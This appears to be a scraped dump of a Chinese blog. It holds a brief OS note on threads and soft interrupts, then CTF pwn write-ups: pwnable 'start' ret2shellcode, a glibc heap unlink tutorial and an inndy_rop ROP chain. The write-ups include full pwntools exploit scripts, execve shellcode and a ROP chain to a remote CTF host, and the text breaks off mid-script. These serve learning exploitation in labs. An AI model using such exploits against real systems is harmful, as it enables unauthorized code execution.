每一个线程都有自己的独立运行栈和程序计数器 并且共享代码和数据空间 线程也不能自己独立执行 必须依附于应用程序 也就是进程中 当有一个线程崩溃掉 整个进程都会崩溃掉 相比之 进程拥有独立的代码和数据空间 进程之间的切换会消耗挺大的开支 一个进程崩溃后 在保护模式下不会对其他进程造成影响 接下来我们来讲软中断 首先要明白什么是中断 举一个例子 在日常生活中 你正在打原神 这时候你接到了你的外卖电话 由于你的学习福建师范大专偷外卖的人很多 你不马上下楼拿就会不见 所以你立刻中断了打原神的操作 下楼去拿外卖 其中 打原神就是一个进程 拿外卖又是一个进程 从打原神向拿外卖的一个执行转化 就是中断 对于计算机来说 中断是一个异步的事件处理机制 可以有效于提高系统的并发处理能力 负责相应中断请求的是中断处理程序 其在相应中断请求的时候 可能还会临时关闭中断 这是什么意思呢 还是接着上面的例子 当我们下楼拿外卖的时候 原神突然发放福利1w原石 但是需要玩家动手领取 这时候你下楼去拿外卖了 也就无法相应这个福利 你就和原石擦肩而过 本来计算机需要相应两次中断 一次拿外卖 一次领福利 但是由于中断处理程序还在执行第一次中断 无法及时相应第二次中断 就丢失了一次中断 那么软中断是什么呢? 其讲一次中断请求分为了两个部分 第一部分用于快速响应中断 直接处理硬件请求 为硬中断 第二部分用于处理第一部分还没有完成的事情 通常是时间较长的事情 为软中断 如何理解呢? 举个例子 A要和你聊事情 约你在一个地方见面 没有分为软中断和硬中断的话 A会和你一直保持通话 期间如果其他人要找你就没有办法响应 如果有软中断的话 就是和A迅速约定好见面地点和时间 然后挂断电话 等待其他人给你打电话 随后你可以面对面询问A遇到什么问题 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"pwnable_start","slug":"pwnable-start","date":"2022-12-04T12:54:30.000Z","updated":"2023-09-14T17:20:24.000Z","comments":true,"path":"2022/12/04/pwnable-start/","link":"","permalink":"http://example.com/2022/12/04/pwnable-start/","excerpt":"","text":"一道很有趣的题目 原理基础ret2shellcode 但是考查了汇编代码的阅读以及栈结构的理解 还有内平栈 涉及到的知识点还是很多的 这里讲细一点 内平栈内平栈（In—Place Stack）是一种特殊的栈，可以在一个给定的数组中存储元素，并可以支持压栈和弹栈操作，且不需要额外的内存空间。保持堆栈平衡的关键是使用一个变量（称为指针，即esp）来跟踪堆栈顶部的位置。当元素被压入堆栈时，指针会指向新元素，表示它是当前堆栈的顶部。当元素被弹出堆栈时，指针会移动到上一个元素的位置，表示它是当前堆栈的新顶部。这样，指针就可以在堆栈操作过程中保持堆栈平衡。 外平栈外平栈（External Stack）是一种特殊的栈，可以存储元素，并可以支持压栈和弹栈操作，但需要额外的内存空间。与内平栈不同，外平栈不使用指针来跟踪堆栈顶部的位置，而是使用两个变量：一个用于标识堆栈顶部的位置(esp)，另一个用于标识堆栈底部的位置(ebp)。当元素被压入堆栈时，顶部变量会指向新元素，表示它是当前堆栈的顶部。当元素被弹出堆栈时，底部变量会指向上一个元素的位置，表示它是当前堆栈的新底部。这样，两个变量就可以在堆栈操作过程中保持堆栈平衡。 程序分析checksec看一下保护机制 [*] &#x27;/home/chen/pwn&#x27; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 保护机制全部关闭 再ida看一下 .text:08048060 public _start.text:08048060 _start proc near ; DATA XREF: LOAD:08048018↑o.text:08048060 push esp.text:08048061 push offset _exit.text:08048066 xor eax, eax.text:08048068 xor ebx, ebx.text:0804806A xor ecx, ecx.text:0804806C xor edx, edx.text:0804806E push 3A465443h.text:08048073 push 20656874h.text:08048078 push 20747261h.text:0804807D push 74732073h.text:08048082 push 2774654Ch.text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h ; LINUX - sys_write.text:08048091 xor ebx, ebx.text:08048093 mov dl, 3Ch ; &#x27;&lt;&#x27;.text:08048095 mov al, 3.text:08048097 int 80h ; LINUX -.text:08048099 add esp, 14h.text:0804809C retn.text:0804809C _start endp ; sp-analysis failed 应该不是用c语言编译的 很干净 只有一个exit函数和start函数 反编译后看不出什么所以然 并且可以看到没有ebp指针 说明这题是内平栈 是利用esp指针来控制程序执行流 __int64 start()&#123; __int64 result; // rax result = 0x3C00000003LL; __asm &#123; int 80h; LINUX - sys_write int 80h; LINUX - &#125; return result;&#125; 这里直接解读汇编吧 .text:08048060 push esp.text:08048061 push offset _exit.text:08048066 xor eax, eax.text:08048068 xor ebx, ebx.text:0804806A xor ecx, ecx.text:0804806C xor edx, edx 前面6行对这个栈帧进行了初始化的操作 push入栈了esp 接着入栈了返回地址为exit函数 随后对于四个寄存器进行了归零操作 .text:0804806E push 3A465443h.text:08048073 push 20656874h.text:08048078 push 20747261h.text:0804807D push 74732073h.text:08048082 push 2774654Ch 16进制转化成人话就是: Let’s start the CTF: 这里的五次push 使得esp指向减少了0x14 此时的栈帧结构为: .text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h 接着把esp所指向的内存空间赋值给了ecx 这里可以看到ida识别出来了 其被作为一个函数的addr参数 这个函数是什么先别急 我们一行一行看 这里出现了一个新的寄存器名称 为什么只是dl？ 并且在ida中我们选中其 会和edx一起关联起来 二者有什么关系？ 32位CPU有4个32位的通用寄存器EAX、EBX、ECX和EDX。对低16位数据的存取，不会影响高16位的数据。这些低16位寄存器分别命名为：AX、BX、CX和DX，它和先前的CPU中的寄存器相一致。4个16位寄存器又可分割成8个独立的8位寄存器(AX：AH-AL、BX：BH-BL、CX：CH-CL、DX：DH-DL)，每个寄存器都有自己的名称，可独立存取。Eax是32位寄存器，ax是16位寄存器,al(ah)是八位寄存器Eax可以存储的数字是DWORD（双字）ax存储的是WORD（字）AL(AH)存储的是BYTE（字节），那么为什么又有AH和AL呢，我们可以这样理解，AX=AH+AL，AH存储的是AX的高８位数据，AL存储的是AX的低八位数据。H这里就是HIGH,Ｌ就是LOW.取自https://blog.csdn.net/EVEPITWANG/article/details/89447466 相当于给这个函数赋值了长度参数(ida识别出来的len) 那么接下来的bl寄存器同理 相当于ebx的低8位 赋值为了1 重点来了 eax的低八位被赋值为了4 随后进行了int 0x80 也就是系统调用 那么我们查询一下调用号为4的函数是什么 发现是write函数 (5条消息) linux 系统调用号表_Anciety的博客-CSDN博客_系统调用号 那么上述汇编代码翻译成c语言也就是 write(1,esp,0x14) 所以 相当于输出了上面push入栈的那0x14字节的数据 也就是输出了相应的字符串 但是这里注意一下 栈仍然是不变的 此时栈的结构和esp指针仍然是保留原状(即上文的图所示) 接下来再看 .text:08048091 xor ebx, ebx.text:08048093 mov dl, 3Ch ; &#x27;&lt;&#x27;.text:08048095 mov al, 3.text:08048097 int 80h ; LINUX - 赋值了两个参数 edx(参数len)为0x3c eax(系统调用号)为3 还有xor ebx,ebx相当于ebx赋为0 调用号3是read函数 也就是 read(0,esp,0x3c) 所以我们可以在esp指针指向的地方 输入0x3c字节数据 接着看剩下的代码 .text:08048099 add esp, 14h.text:0804809C retn 使esp寄存器的值增加0x14 此时esp指向的是存放offset _exit地址的空间 随后retn指令相当于pop eip 也就是控制程序执行流到exit函数 进行一个退出 在retn过后 此时栈帧就只剩下一个old esp了 分析完了程序 那么我们来想一下利用的思路 我们拥有栈溢出的机会 并且得知了具体哪一块栈空间可以用来控制程序执行流 并且保护全关 没有system函数也没有泄露libc的机会 也没有足够的栈溢出长度来供我们使用onegadget生成的shellcode直接pwn 那么这时候想到的是ret2shellcode 我们只能在栈上写入shellcode 但是没有bss段供我们写入的机会 所以只能写在栈上 那么要做的就是泄露栈上的地址 想一下 程序唯一能够利用输出的地方也就是write函数那边了 .text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h ; LINUX - sys_write 看到第一个 mov ecx,esp 我们再联想到 retn指令执行完了以后 栈帧只剩下了old esp 并且此时esp仍然指向old esp 此时如果执行 这一行指令 那么ecx的值就会被赋为old esp 也就是程序会输出old esp 也就是泄露了栈地址 所以我们第一次写入的payload为 payload = cyclic(0x14)+p32(0x8048087)#0x14字节的垃圾数据用来填充push入栈的那串字符串 p32(0x8048087)覆盖的是offset _exit 用来控制程序执行流 此时程序就会输出old esp 那么接下来又要怎么利用 我们知道 控制程序执行流利用的是retn这个指令 但是在其生效前 esp指针会被抬高0x14字节 所以我们需要0x14字节的垃圾数据 然后再往栈上写入shellcode存放的地址 然后控制程序执行流到shellcode 这一系列的操作用图演示为; 所以此时eip接收到了stack_addr(我们泄露的栈地址)+0x14 其寻址到shllcode的栈空间 于是我们就获取了shell 完整的exp: from pwn import*io = process(&quot;./pwn&quot;)io.recv()payload = cyclic(0x14)+p32(0x8048087)io.send(payload)stack_addr = u32(io.recv(4))shellcode = b&quot;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&quot;#这里不能用pwntools生成的shellcode 估计是太长了 溢出空间不够payload = cyclic(0x14)+p32(stack_addr+0x14)+shellcodeio.send(payload) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"unlink","slug":"unlink","date":"2022-11-28T15:31:20.000Z","updated":"2023-09-14T17:20:54.000Z","comments":true,"path":"2022/11/28/unlink/","link":"","permalink":"http://example.com/2022/11/28/unlink/","excerpt":"","text":"很多时候 堆题的操作都是篡改got表 从而getshell 为了达到这一目的 就需要我们得到任意地址写的机会 其中unlink就是一个典型的办法 其主要分为两种情况 向后合并和向前合并 向后合并本次演示基于的二进制文件 这里就不展示反编译后的代码了 其拥有堆溢出的机会 所以我们可以通过这个修改chunk的size域 先来看一下用于调试的代码 create(0,0x18)create(1,0x28)create(2,0x28)payload = cyclic(0x18)+b&quot;\\x61&quot;edit(0,payload) 申请了三个堆块 chunk0是用于堆溢出覆盖chunk1的size域 gdb查看一下当前堆的状况 可以看到chunk1和chunk2已经成功合并了 并且你要注意一下大小 chunk1我们申请的是0x28 但是由于堆的机制 64位的情况下申请的堆块的基本单位是0x10 所以此时这个堆块的用户空间是0x20 而gdb上显示的是0x31(0x20+0x10+0x1) 所以溢出覆盖size域的大小应该是chunk实际占用的大小 如果利用这种机制呢？我们chunk此时是和chunk1合并了 但是我们仍然有一个指向chunk2的指针不是吗？ 如果我们此时再edit chunk2 输入的数据会存放在哪里呢 create(0,0x18)create(1,0x28)create(2,0x28)payload = cyclic(0x18)+b&quot;\\x61&quot;edit(0,payload)edit(2,b&quot;aaaaaaaa&quot;)gdb.attach(io) 其仍然有效 此时你有没有一些利用的想法 利用这个系统觉得不存在的指针？ create(0,0x18)create(1,0x68)create(2,0x68)create(3,0x20)payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,payload)delete(1)create(4,0x68)create(5,0x68)delete(5)edit(2,b&quot;aaaaaaaa&quot;)gdb.attach(io) 看一下这个流程 看看能不能领会其用意 我们逐步分析一下 申请的chunk0，1，2没有什么疑问 是为了合并chunk chunk3是为了防止chunk1释放以后和top chunk合并 紧接着申请了一个0x68大小的chunk4 系统就会把之前存储在unsortedbin的0xe0大小的chunk分割 此时chunk4申请到的内存空间和chunk1(未合并前)是一样的 此时我们再次申请0x68大小的chunk 分配给chunk5的就是原先chunk2的空间了 但是这里注意一下 chunk2的指针是不是仍然存在 那我们就拥有了两个指向同一内存空间的指针 我们哪怕释放掉了这个chunk 我们也可以edit其内容 如果这个chunk被释放到了fastbin呢？那么我们edit其chunk内容 是不是输入的第一个字长就是覆盖了fd域的空间 也就是说 我们伪造了一个fake chunk 让系统以为 当前的单向链表 这个chunk的下一个是我们伪造的内存空间 可以看到 系统把aaaaaaaa当成了一个chunk的地址 是不是觉得很简单 那么我们接下来再看unlink的源码 /* Take a chunk off a bin list. */static voidunlink_chunk (mstate av, mchunkptr p)&#123;//检查chunk的size和next_chunk的prev_size是否一致if (chunksize (p) != prev_size (next_chunk (p)))malloc_printerr (“corrupted size vs. prev_size”);mchunkptr fd = p-&gt;fd;mchunkptr bk = p-&gt;bk;//检查fd和bk(双向链表完整性)if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))malloc_printerr (“corrupted double-linked list”);fd-&gt;bk = BK;bk-&gt;fd = FD;if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)&#123;//检查largebin中next_size双向链表的完整性if (p-&gt;fd_nextsize-&gt;bk_nextsize != p|| p-&gt;bk_nextsize-&gt;fd_nextsize != p)malloc_printerr (“corrupted double-linked list (not small)”);if (fd-&gt;fd_nextsize == NULL)&#123;if (p-&gt;fd_nextsize == p)fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;else&#123;fd-&gt;fd_nextsize = p-&gt;fd_nextsize;fd-&gt;bk_nextsize = p-&gt;bk_nextsize;p-&gt;fd_nextsize-&gt;bk_nextsize = fd;p-&gt;bk_nextsize-&gt;fd_nextsize = fd;&#125;&#125;else&#123;p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;&#125;&#125;&#125; 主要有两个检查 1.检查当前chunk的size和nextchunk的prev_size是否相同 2.检查链表的完整性，即fd和bk 这里size的检查很容易就绕过了 接下来的理解难点在于链表的fd和bk的伪造 if(__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P,0)) malloc_printerr (&quot;corrupted double-linked list&quot;);//其中的FD和BK和P为上图所示 关键在于这一个if判断 如果你和我一样 学到这里的时候 c语言的指针都还没学透 那你可以仔细阅读下面这段话 方便你理解接下来的判断式 FD-&gt;bk相当于表示FD结构体的成员bk 而bk为结构体变量指针类型存储的是FD的上一个chunk，即P的prev_size的地址BK-&gt;fd同理 把这两个判断转化一下就是 unlink过后 BK和FD就抛弃了中间的P 他们二者的fd和bk指针互连 FD-&gt;bk != P || BK-&gt;fd != PFD和BK之前已经定义过了FD = P-&gt;fd;BK = P-&gt;bk;所以上述的式子相当于:P-&gt;fd-&gt;bk == P &lt;=&gt; *(p-&gt;fd +0x18) == P &lt;=&gt;相当于恒等于p-&gt;bk-&gt;fd == P &lt;=&gt; *(p-&gt;bk +0x10) == P 所以我们构造的fake_chunk的fd应该是ptr_addr-0x18 bk应该是ptr_addr-0x10 这里的ptr_addr即为我们想要任意写的地址 检查通过以后 程序就会按照下面的式子修改FD和BK的fd和bk指针 FD-&gt;bk = BK &lt;=&gt; P-&gt;fd-&gt;bk = p-&gt;bk &lt;=&gt; *(P-&gt;fd + 0x18) = P-&gt;bk //ⅠBK-&gt;fd = FD &lt;=&gt; P-&gt;bk-&gt;fd = p-&gt;fd &lt;=&gt; *(P-&gt;bk + 0x10) = P-&gt;fd //Ⅱ I式的演变过程:∵ P-&gt;fd = &amp;P - 0x18 ∴ *(&amp;P - 0x18 + 0x18) = P-&gt;bk =&gt; P = P-&gt;bk∵ P-&gt;bk = &amp;P - 0x10 ∴ P = &amp;P - 0x10 II式的演变过程:∵ P-&gt;bk = &amp;P - 0x10 ∴ *(P-&gt;bk + 0x10) = P-&gt;fd =&gt; P = P-&gt;fd∵ P-&gt;fd = &amp;P - 0x18 ∴ P = &amp;P - 0x18 所以 最后的p指针将指向&amp;p-0x18的位置 也就是说当我们成功unlink后 需要增加3个字长的垃圾数据后 才能覆盖到ptr_addr 下面来看一下脚本 create(0,0x80)create(1,0x80)create(2,0x80)ptr_addr = 0x6020C0backdoor_addr = 0x400806payload = p64(0)+p64(0x80)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)payload = payload.ljust(0x80,b&quot;0&quot;)payload += p64(0x80)+p64(0x90)edit(0,len(payload),payload)delete(1)payload = p64(0)*3+p64(elf.got[&#x27;printf&#x27;])edit(0,len(payload),payload)edit(0,8,p64(backdoor_addr))io.recvuntil(&quot;:&quot;)io.sendline(b&quot;1&quot;)io.interactive() 我们先申请了三个chunk chunk0是用来构造fake_chunk chunk1则是用来迎合检查 chunk0此时的内部构造为 绿框部分是我们伪造的fakechunk 紫框为chunk1 我们将其的prev_size和size覆盖 为了通过第一个检查 随后我们释放chunk1 如果我们构造成功 此时系统就会检查我们构造的链表是否正确 如果通过了检查 我们构造的fakechunk就会从链表中脱离 于是我们就得到了一个指向ptr_addr-0x18地址的chunk 接下来要怎么利用 注意看上面脚本的ptr_addr是存放堆块指针的bss段的数组 我们利用unlink将其存放chunk0的地址修改成printf_got的地址 那么当我们第三次edit chunk0的时候 相当于就是往printf_got的地址写入数据 于是我们将后门函数的地址写进去 当下次调用printf函数的时候 就进行了系统调用(后门函数是我为了演示方便加进去的 一般题目不会这么简单) ps:这里在出unlink的题的时候 遇到了一个问题: 当释放chunk1想要进行unlink的时候 程序就会崩溃 后来经过两天的坐牢时间 发现了问题的原因出在于存放堆块指针的那个数组的低地址处也要有至少0x18大小的全局数组 即如下图所示 需要有个magic数组 各位师傅以后出unlink题的时候可以留意一下 为什么我们经常看到别人的wp会写说 多申请一个chunk用来防止和top chunk合并 下面看一下演示 create(0,0x80)delete(0) 当我们只申请了一个chunk 并且将其释放以后 你预想的是他会进入对应的bin中 但是如果他物理相邻的高地址处的chunk是topchunk的话 topchunk就会触发向后合并 我们需要多申请一个chunk在要释放的chunk的物理相邻高地址处 create(0,0x80)create(1,0x20)delete(0) 向前合并目前还没有遇到用到向前合并的题目 感兴趣的可以自行了解 利用FD和BK的fd、bk指针buu上遇到了一题比较新颖的unlink 和常规的有所不同 这里以此为例题来讲讲 其利用方向不是脱链获得任意写的机会 而是利用FD和BK在脱链后的fd和bk指针的变化来覆盖返回地址 控制程序执行流 [*] &#x27;/home/chen/unlink1&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位的堆 还是比较少见的 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v4; // [esp+4h] [ebp-14h] BYREF _DWORD *v5; // [esp+8h] [ebp-10h] _DWORD *v6; // [esp+Ch] [ebp-Ch] malloc(0x400u); v4 = (char *)malloc(0x10u); v6 = malloc(0x10u); v5 = malloc(0x10u); *(_DWORD *)v4 = v6; v6[1] = v4; *v6 = v5; v5[1] = v6; printf(&quot;here is stack address leak: %p\\n&quot;, &amp;v4); printf(&quot;here is heap address leak: %p\\n&quot;, v4); puts(&quot;now that you have leaks, get shell!&quot;); gets(v4 + 8); unlink(v6); return 0;&#125; 申请了三个堆块 并且给出了堆块v4在栈上的地址和堆上的地址 这里为了方便理解 我修改了下三个chunk的名称 接下来请以下方的代码为准 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v4; // [esp+4h] [ebp-14h] BYREF _DWORD *v5; // [esp+8h] [ebp-10h] _DWORD *v6; // [esp+Ch] [ebp-Ch] malloc(0x400u); A = (char *)malloc(0x10u); B = malloc(0x10u); C = malloc(0x10u); *(_DWORD *)A = B; B[1] = A; *B = C; C[1] = B; printf(&quot;here is stack address leak: %p\\n&quot;, &amp;A); printf(&quot;here is heap address leak: %p\\n&quot;, A); puts(&quot;now that you have leaks, get shell!&quot;); gets(A + 8); unlink(B); return 0;&#125; 我们先来分析一下这四行代码对这三个堆块的内容进行了哪些操作 *(_DWORD *)A = B;B[1] = A;*B = C;C[1] = B; 第一行 *A&#x3D;B 将B的首地址存在了A的fd域(实际上A并没有被释放 所以其没有fd域 这里只是为了方便称呼) 第二行 B[1]&#x3D;A B[1]相当于B的bk域 存储了A的首地址 第三行 *B&#x3D;C 将c的首地址存在了B的fd域 第四行 C[1]&#x3D;B 同理 将B的首地址存储在了c的bk域 用图片来展示一下 此时三个堆块的情况 可以看到 相当于模拟了三个chunk在双向链表中的情况 接着给了我们一次堆溢出的机会 get(A+8)相当于往A的bk域再往下一个字长处写入数据 即data域 接着跟进一下unlink函数 _DWORD *__cdecl unlink(int *a1)&#123; _DWORD *result; // eax int fd; // [esp+8h] [ebp-8h] _DWORD *bk; // [esp+Ch] [ebp-4h] bk = a1[1]; fd = *a1; *(fd + 4) = bk; result = bk; *bk = fd; return result;&#125; 因为unlink的参数是B 所以此时bk和fd的赋值就是其名(我同样对变量名称进行了修改) 在fd+4地址处的内容赋值为bk 并且将bk地址处的内容赋值为fd 那么这里就存在了一次任意地址写 如果我们通过堆溢出将fd覆盖为想要任意写的内容 接着将bk覆盖为想要任意写的地址 就可以利用这一漏洞 分析完了程序的主体流程和漏洞 接下来就是想着怎么利用了 在左侧的函数栏中发现了一个后门函数 那么显然就是要将此后门函数覆盖某一地址 然后进行系统调用 但是不同于以往的覆盖got表 这里在unlink函数结束以后 并没有调用任何libc函数 那么只能将目光看向 main函数的栈帧结束后 汇编代码是如果ret到父函数 .text:080485F2 call unlink.text:080485F7 add esp, 10h.text:080485FA mov eax, 0.text:080485FF mov ecx, [ebp+var_4].text:08048602 leave.text:08048603 lea esp, [ecx-4].text:08048606 retn lea esp, [ecx-4] 显然 我们要利用的就是这一串汇编代码 他会控制程序执行流往ecx-4所存储的地址 再看到 mov ecx, [ebp+var_4] ecx的值等同于ebp-4地址的值 所以 我们就要利用堆溢出 覆盖B-&gt;fd为存储后门函数地址的地址 B-bk为ebp-4的地址 from pwn import*io = process(&quot;./unlink1&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25709)elf = ELF(&quot;./unlink1&quot;)context.log_level = &quot;debug&quot;io.recvuntil(&quot;here is stack address leak: &quot;)stack_addr = int(io.recvuntil(&quot;\\n&quot;,drop = True),16)io.recvuntil(&quot;here is heap address leak: &quot;)heap_addr = int(io.recvuntil(&quot;\\n&quot;,drop = True),16)io.recvuntil(&quot;now that you have leaks, get shell!&quot;)shellheap_addr = heap_addr+12ebp4_addr = stack_addr+0x14-0x4shell_addr = 0x80484EBpayload = p32(shell_addr)+b&#x27;a&#x27;*12+p32(shellheap_addr)+p32(ebp4_addr)io.send(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"inndy_rop","slug":"inndy-rop","date":"2022-11-24T15:34:05.000Z","updated":"2023-09-14T17:19:48.000Z","comments":true,"path":"2022/11/24/inndy-rop/","link":"","permalink":"http://example.com/2022/11/24/inndy-rop/","excerpt":"","text":"这一题以前没遇到过 算是蛮新奇的 所以记录下来 还学到了ROPgadget的新用法 [*] &#x27;/home/chen/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 32位 没有开启pie和canary ida打开后发现只有一个简单的gets溢出的机会 int overflow()&#123; char v1[12]; // [esp+Ch] [ebp-Ch] BYREF return gets(v1);&#125; 并且这题是静态编译 ida打开会出现一大堆乱七八糟的函数 静态编译没有调用libc函数 所以这题也就不存在泄露libc然后获取system函数地址 进行系统调用的做法了 那么这时候 就需要用到ROPgadget其一个功能 自动生成一串rop链 ROPgadget --binary file_name --ropchain # Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80 他已经自动帮我们生成好脚本了 我们只需要手动加上偏移 就可以pwn成功 但是这里需要注意 你需要添加一个库 如果没有这个库 脚本会报错 Traceback (most recent call last): File &quot;/home/chen/exp.py&quot;, line 51, in &lt;module&gt; p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret File &quot;/home/chen/.local/lib/python3.6/site-packages/pwnlib/util/packing.py&quot;, line 102, in pack if sign is None and number &lt; 0:TypeError: &#x27;&lt;&#x27; not supported between instances of &#x27;str&#x27; and &#x27;int&#x27; 库: from struct import pack 完整exp: from pwn import*from struct import packdef libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_32&#x27;ip=&quot;node4.buuoj.cn&quot;port=27246elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)p = b&#x27;a&#x27; * (0xc+0x4)p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; retp += 